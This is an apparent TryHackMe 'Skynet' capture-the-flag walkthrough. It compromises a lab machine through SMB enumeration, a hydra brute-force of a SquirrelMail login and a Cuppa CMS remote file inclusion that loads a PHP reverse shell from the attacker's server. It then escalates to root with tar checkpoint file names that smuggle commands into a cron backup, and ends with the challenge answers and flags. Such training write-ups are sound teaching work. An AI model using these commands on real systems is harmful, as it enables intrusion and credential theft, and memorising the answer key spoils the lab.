# TryHackMe: Skynet

#### [Task 1] Deploy and compromise the vulnerable machine!

To compromise the machine in the challenge first use dirb to discover hidden directories
Run the command `dirb http://10.10.86.78 /usr/share/wordlists/rockyou.txt`

The output of dirb command is shown bellow

<img width="866" alt="1" src="https://user-images.githubusercontent.com/28839345/165290906-62a315d3-c63f-4d84-8733-c54f50449e93.png">

Then next tool to use that can give you some information about the machine is nmap.Tun the following command `nmap -sV -open -p- 10.10.86.78`

<img width="958" alt="2" src="https://user-images.githubusercontent.com/28839345/165290912-d0215a0c-80ed-46ad-b852-074a966691bf.png">

Try to enumerate the smb server to find if there is any smb share which can be used to get Miles password.Run the command `nmap --script smb-enum-shares -p 139,445 10.10.86.78`.

<img width="741" alt="3" src="https://user-images.githubusercontent.com/28839345/165290918-adc38a09-152c-49f7-8304-c35b0bced4d9.png">

<img width="658" alt="4" src="https://user-images.githubusercontent.com/28839345/165290924-bff44cb8-ea2c-49d6-bce0-84fdc8992ae5.png">

From the last nmap scan you see that there is a share which can be accessed anonymously and another scan which name is 'milesdyson'

Try to connect anonymously to the anonymous share since you dont know the password for 'milesdyson' share with the command `smbclient //10.10.86.78/Anonymous`

<img width="568" alt="5" src="https://user-images.githubusercontent.com/28839345/165290928-644010ea-2c0c-442f-a54a-3ad775a3c35b.png">

Use the `ls` command to check if there are any files that seem interesting.

<img width="691" alt="6" src="https://user-images.githubusercontent.com/28839345/165290929-6c435f57-830f-425d-b1bd-821042201fc8.png">

Exit out of the smb server and try to download all contents with the following command 
`smbget -R smb://10.10.86.78/anonymous`

<img width="607" alt="7" src="https://user-images.githubusercontent.com/28839345/165290934-f2721b07-3a4d-466e-ae98-813aa229a51d.png">

Check the contents of attention.txt.

<img width="722" alt="8" src="https://user-images.githubusercontent.com/28839345/165290937-dcc4ce97-f162-41f8-a46b-14d108466f84.png">

'A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.'

-Miles Dyson

You will see that there is a guy that his name is "Miles Dyson".


Then check the content of the files 'log1.txt,log2.txt' and 'log3.txt'.File 'log1.txt' is a simple wordlists and the other two files are empty.

<img width="413" alt="9" src="https://user-images.githubusercontent.com/28839345/165290939-c5b1e2ee-2f92-4a10-ba29-336965a4dcfe.png">

<img width="404" alt="10" src="https://user-images.githubusercontent.com/28839345/165290942-d2b2f356-187c-4e4b-bc6d-2c0d3312b121.png">

Try to redirect index.html page so you can find more information about Miles Dysons account.

<img width="1213" alt="11" src="https://user-images.githubusercontent.com/28839345/165290944-e3eb3541-be26-4ff8-a8ee-5559780a32f9.png">

Since there is not something that will help up compromise the machine lets redirect to /squirrelmail directory that you found from the dirb scan.Try to see if there are any default credentials like username: 'admin' and password: 'admin' and you will get an error.

<img width="1089" alt="12" src="https://user-images.githubusercontent.com/28839345/165290948-92fca724-69b9-40b6-b6ee-5682c66e2d6a.png">

<img width="1326" alt="13" src="https://user-images.githubusercontent.com/28839345/165290951-5f5a33be-c8d1-49a7-91c1-da9f6f6e99cb.png">

There is a login page.To brute force this login form do the following steps.

Try to capture a request packet with burp suite.

1. Check if the method is 'POST' or 'GET'.

2. Get the request path.

3. The request body.
4. The error message when login or password is incorrect.

<img width="1007" alt="14" src="https://user-images.githubusercontent.com/28839345/165290959-8fc14954-aea5-49eb-930a-ed601ce6e84b.png">

<img width="708" alt="15" src="https://user-images.githubusercontent.com/28839345/165290966-4b15caa3-4148-4ab9-9c6e-e672cfcb05cb.png">

From the packet request you see that the method is 
1. The request method is 'POST'.
2. The request path is '/squirrelmail/src/redirect.php'.
3.  The request  body is 'login_username=testUsername&secretkey=testPassword&js_autodetect_results=1&just_logged_in=1 ''.
4. The error message is 'Unknown user or password incorrect.'

The final hydra command will be 

`hydra -l milesdyson -P logs/log1.txt 10.10.236.12 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."`

As you can see from the below image you will find successfully the password of milesdyson account and you will be redirected to his email account.

<img width="1366" alt="16" src="https://user-images.githubusercontent.com/28839345/165290971-6a720119-d8cd-41ca-902a-45d5683c95e5.png">

<img width="848" alt="17" src="https://user-images.githubusercontent.com/28839345/165290975-8be5a064-c034-4db2-8591-14dfec2807c8.png">

Then click on the first email
and you will find Miles smb account password.


<img width="1148" alt="18" src="https://user-images.githubusercontent.com/28839345/165290979-6c87a1d1-2dae-4196-9df2-08281c272b43.png">

<img width="1141" alt="19" src="https://user-images.githubusercontent.com/28839345/165290980-e4e7859d-4d25-4d0d-a2da-7666600ac551.png">

As you see the password is 

')s{A&2Z=F^n_E.B'

Connect to milesdyson smb account.
`smbclient -U milesdyson //10.10.236.12/milesdyson`

<img width="709" alt="20" src="https://user-images.githubusercontent.com/28839345/165290983-f88ac6eb-a02d-46b5-acff-02471e3ab3ee.png">
Then type `ls` to see Miles files.

<img width="920" alt="21" src="https://user-images.githubusercontent.com/28839345/165290986-bbc4183a-4dab-4e23-b9a9-eb4aa3f69fee.png">

<img width="900" alt="22" src="https://user-images.githubusercontent.com/28839345/165290992-bd607c5c-80d6-49f3-ba73-f3651bb34c26.png">


<img width="739" alt="23" src="https://user-images.githubusercontent.com/28839345/165290995-7fcfba98-ebdc-42c1-9b95-5cfb43160438.png">

Read the file 'important.txt' by running the command `more important.txt`.

You will see that there is a hidden directory.Go to that directory.

<img width="435" alt="24" src="https://user-images.githubusercontent.com/28839345/165291000-7e2e9ba4-a7dd-4755-b302-61ab822f407a.png">

Run gobuster to search for other subdiretories.

`gobuster dir -u 10.10.236.12/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/common.txt`

<img width="1074" alt="25" src="https://user-images.githubusercontent.com/28839345/165291003-83f4014f-af59-4916-b978-dbe289b0c752.png">

Go to the new directory discovered at 'http://10.10.236.12/45kra24zxs28v3yd/administrator'.Then google CUPA CMS exploit and you will find a remote file inclusion exploit -# Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion.

First test if the exploit works.Type this on the url input 'http:/10.10.236.12/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd' and you should see the content of the /etc/passwd file.


<img width="1433" alt="29" src="https://user-images.githubusercontent.com/28839345/165291035-36f866d0-0b95-4e67-b342-e0166339f35a.png">

Then download a php reverse shell from pentestmonkey.com and name the file 'php-reverse-shell.php' in your home directory.Change the ip to your machines IP and port number to 1234.Run netcat `nc -nlvp 1234` and start a python HTTP server by running the command `python3 -m http.server`.Finally to connect to the web server with the reverse php shell redirect to http://10.10.200.71/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.200.71:8000/php-reverse-shell.php.

Step 1.
Save the php reverse shell with the corrent IP and port number.

<img width="607" alt="30" src="https://user-images.githubusercontent.com/28839345/165291064-f909e5df-b5c5-4b7b-b385-1995c6692b2b.png">

Step 2.
Start the http server.

<img width="722" alt="31" src="https://user-images.githubusercontent.com/28839345/165291072-08d9e470-a515-435d-878d-86b2d50029d3.png">

Step 3.
Start the netcat listener and listen to the correct port.

<img width="575" alt="32" src="https://user-images.githubusercontent.com/28839345/165291083-7657fedb-95a6-4dc7-ad22-0ae0e4f0bbfe.png">

If you follow the previous steps you will connect to the web server.

<img width="1078" alt="33" src="https://user-images.githubusercontent.com/28839345/165291088-78ebca04-36a1-4a4d-951c-f16b09afcb38.png">

In the directory '/home/milesdyson' you will find the user.txt file which contains the user flag.

<img width="325" alt="34" src="https://user-images.githubusercontent.com/28839345/165291093-e7d640ca-ff30-497c-a590-706c297c2633.png">

The run the command `cat /etc/crontab` and you will see a task that is running on '/home/milesdyson/backups/backup.sh'

<img width="932" alt="35" src="https://user-images.githubusercontent.com/28839345/165291096-2e14e006-f201-4e5b-9e15-04863c408047.png">

Go to '/home/milesdyson/backups' directory and check the content of backup.sh

<img width="638" alt="36" src="https://user-images.githubusercontent.com/28839345/165291103-998293c7-7df1-4cec-a979-d24ef90ad842.png">

<img width="466" alt="37" src="https://user-images.githubusercontent.com/28839345/165291108-3e16a61d-6f44-4f80-b5d5-6cf4776192bf.png">

Now you are going to set the suid bit on /bin/bash because you want the next time the cronjob runs to execute /bin/bash as root.Then you will automatically escalate your priviledges after running `/bin/bash -p`

Go to /var/www/html directory and run the following commands.

`printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh`

`echo "" > "--checkpoint=action=exec=sh shell.sh"`

`echo "" > "--checkpoint=1"`

Then wait until the cronjob runs in the next minuite.
Run `/bin/bash -p` and you will beome root.Check if you are root by running the command `whoami`

<img width="491" alt="38 1" src="https://user-images.githubusercontent.com/28839345/165291112-bbd48f2e-a2f7-4d28-a330-fc8fa43a8b53.png">


<img width="151" alt="38" src="https://user-images.githubusercontent.com/28839345/165291110-fcfd837e-b7cb-487f-b182-03cd5da0ea56.png">

Finally go to '/root' and print 'root.txt' to get the root flag by running `cat root.txt`

<img width="331" alt="39" src="https://user-images.githubusercontent.com/28839345/165291117-8bce1dc0-8139-4155-b1aa-ffcce9ac446e.png">


**What is Miles password for his emails?**

cyborg007haloterminator


**What is the hidden directory?**

/45kra24zxs28v3yd

**What is the vulnerability called when you can include a remote file for malicious purposes?**  
 remote file inclusion 
  
**What is the user flag?**

7ce5c2109a40f958099283600a9ae807

**What is the root flag?**

3f0372db24753accc7179a282cd6a949

  



















